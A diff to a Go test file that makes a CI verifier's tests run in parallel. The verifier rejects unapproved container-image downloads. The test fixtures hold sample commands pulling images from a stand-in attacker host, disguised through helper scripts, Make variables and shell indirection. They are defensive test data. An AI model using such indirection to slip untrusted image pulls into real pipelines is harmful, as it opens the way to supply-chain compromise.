@@ -7,6 +7,7 @@ import (
 )
 
 func TestVerifyCIContainerDownloadsRejectsProtectedPlaywrightWorkflowRoutes(t *testing.T) {
+	t.Parallel()
 	for _, target := range []string{"fe-visual", "fe-visual-update", "e2e", "e2e-update", "tuner-e2e"} {
 		t.Run(target, func(t *testing.T) {
 			root := writeCIContainerDownloadsFixture(t)
@@ -71,6 +72,7 @@ func TestVerifyCIContainerDownloadsRejectsProtectedPlaywrightWorkflowRoutes(t *t
 }
 
 func TestVerifyCIContainerDownloadsRejectsArbitraryAcquisitionMakeRoutes(t *testing.T) {
+	t.Parallel()
 	tests := map[string]string{
 		"bounded helper with attacker image": `acquire-image:
 	./scripts/ensure-container-image.sh attacker.invalid/image:pinned
@@ -144,6 +146,7 @@ jobs:
 }
 
 func TestVerifyCIContainerDownloadsRejectsInlineAcquisitionMakeRoutes(t *testing.T) {
+	t.Parallel()
 	tests := map[string]string{
 		"direct pull":        `acquire-inline: ; docker pull attacker.invalid/image:pinned`,
 		"helper":             `acquire-inline: ; ./scripts/ensure-container-image.sh attacker.invalid/image:pinned`,
@@ -174,6 +177,7 @@ jobs:
 }
 
 func TestVerifyCIContainerDownloadsRejectsMakeEngineIndirection(t *testing.T) {
+	t.Parallel()
 	tests := map[string]string{
 		"assigned parenthesized variable": "ENGINE := docker\nacquire-variable:\n\t$(ENGINE) pull attacker.invalid/image:pinned\n",
 		"assigned braced variable":        "ENGINE := docker\nacquire-variable:\n\t${ENGINE} image pull attacker.invalid/image:pinned\n",
@@ -201,6 +205,7 @@ jobs:
 }
 
 func TestVerifyCIContainerDownloadsRejectsWorkflowTargetIndirection(t *testing.T) {
+	t.Parallel()
 	commands := map[string]string{
 		"quoted variable":      `TARGET=test-pg; make "$TARGET"`,
 		"braced variable":      `TARGET=test-pg; make "${TARGET}"`,
@@ -224,6 +229,7 @@ jobs:
 }
 
 func TestVerifyCIContainerDownloadsRejectsInheritedWorkflowExecutableAliases(t *testing.T) {
+	t.Parallel()
 	tests := map[string]string{
 		"workflow Make alias": `name: extra
 on: push
@@ -285,6 +291,7 @@ jobs:
 }
 
 func TestVerifyCIContainerDownloadsRejectsWrappedOrConstructedWorkflowRoutes(t *testing.T) {
+	t.Parallel()
 	tests := map[string]string{
 		"exec Postgres Make": `name: extra
 on: push
@@ -351,6 +358,7 @@ jobs:
 }
 
 func TestVerifyCIContainerDownloadsRejectsConditionalTargetConstruction(t *testing.T) {
+	t.Parallel()
 	commands := map[string]string{
 		"skipped OR assignment":       `TARGET=dev; true || TARGET=help; make "$TARGET"`,
 		"skipped AND assignment":      `TARGET=dev; false && TARGET=help; make "$TARGET"`,
